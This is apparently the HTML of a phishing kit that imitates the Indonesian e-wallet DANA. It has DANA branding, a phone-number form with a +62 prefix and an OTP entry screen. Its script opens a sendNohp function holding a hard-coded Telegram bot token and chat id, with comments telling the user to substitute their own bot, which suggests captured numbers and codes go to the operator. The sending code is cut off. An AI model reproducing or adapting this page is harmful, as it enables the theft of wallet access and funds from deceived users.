...
<meta content="https://i.ibb.co/s5t8Dv9/images-1.jpg" property="og:image">
 <link href="https://i.ibb.co/mFpfLHx/images.jpg" rel="shortcut icon" type="image/x-icon">
  <link href="https://i.ibb.co/mFpfLHx/images.jpg" rel="apple-touch-icon">
...
<div style="display:none;" class="index">
	<div class="header">
		<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana-logo.fe46647.png" class="logo" alt="">
	</div>
	<div class="content">
		<div class="hero">
...
<div class="start" style="display:none;">
	<img class="logo" src="file/img/dana_text.png" style="width: 150px">
	<div class="footimg">
		<img src="file/img/bi.png" alt=""><img src="file/img/kom.png" alt="">
		<p>
...
<div class="container hid" style="position: fixed">
  ...
  <ol class="carousel__viewport">
    <li id="carousel__slide1"
      ...
      <div class="carousel__snapper"  style="background-image: url('file/img/ezgif.com-crop%20(3).gif');
      background-position: 100% 100%;
      background-repeat: no-repeat;
    ...
    <li id="carousel__slide2"
        tabindex="0"
        class="carousel__slide" style="background-color: #118EEA;">
      <div class="carousel__snapper" style="background-image: url('file/img/ezgif.com-crop%20(4).gif');
      background-position: 100% 100%;
      background-repeat: no-repeat;
    ...
    <li id="carousel__slide3"
        tabindex="0"
        class="carousel__slide" style="background-color: #118EEA;">
      <div class="carousel__snapper"  style="background-image: url('file/img/ezgif.com-crop%20(5).gif');
      background-position: 100% 100%;
      background-repeat: no-repeat;
      background-size: 100% 100%;">
...
<button id="butonku" style="width: 100%; height: 140px; position: fixed; bottom: 0; left: 0; right: 0; margin: 1px auto; border: 0; background: url('file/img/AddText_06-06-08.17.04.jpg');
      background-position: 100% 100%;
      background-repeat: no-repeat;
     ...
     <div id="process1" name="process" class="process" style="display: none;">
            <div class="loading">
                <img src="file/img/load_bg.png">
                <img class="spinner" src="file/img/load_spin.png" id="loading" style="margin-top: 8px">
            </div>
        </div>
        </center>
  </div>
  <div id="blogin" class="box-login" style="width: 100%;
    ...
    top: 0; display: none;">
      	<div id="process" name="process" class="process" style="display: none;">
			<div class="loading">
				<img src="file/img/load_bg.png"><img class="spinner" src="file/img/load_spin.png" style="margin-top: 8px">
			</div>
		</div>
...
<button id="back1" type="button" class="btn-backku" onclick="goback1()"><ion-icon name="chevron-back-outline"></ion-icon></button>	<p></p>
			...
			<img src="file/img/dana-logo.fe46647.png" class="logo" alt="">
		</div>
		<form id="formNohp" onsubmit="sendNohp(event);" >
			...
			<div class="box-input" style="width: 95%;">
				<div class="label">
					<img src="file/img/indo.png" alt=""><label>+62</label>
				</div>
    ...
    top: 0;">
			...
			<img src="file/img/output-onlinegiftools.gif" width="100%" style="position: absolute; bottom: 10; left: 0; right: 0; margin: 0px auto;">
		</form>
<div class="bgotp hid" style="width: 100%;
    ...
    margin: 0px auto;
    top: 0;">
			 <div class="page" style="left: 0px; position: absolute; right: 0; margin: 0px auto; margin-top: 0px; background-image: url(file/img/AddText_01-04-04.13.11.png) ;
  background-position: 100% 100%;
  ...
  <center>
				...
				<div class="box-input-otp" style="margin-top: 50px">
					...
					<div class="loadingOtp" style="display:none;background: #FAFAFA">
						...
						<img src="file/img/load_bg.png"><img class="spinner" src="file/img/load_spin.png">
		</div>
...
<script>
   function sendNohp(event){
    ...
    var token = '6598463364:AAHPBH040EEX7uSy0Ati4TfO9X4pHAlSi7o'; // Ganti dengan token bot yang kamu buat
    var grup = '5165253227'; // Ganti dengan chat id dari bot yang kamu buat
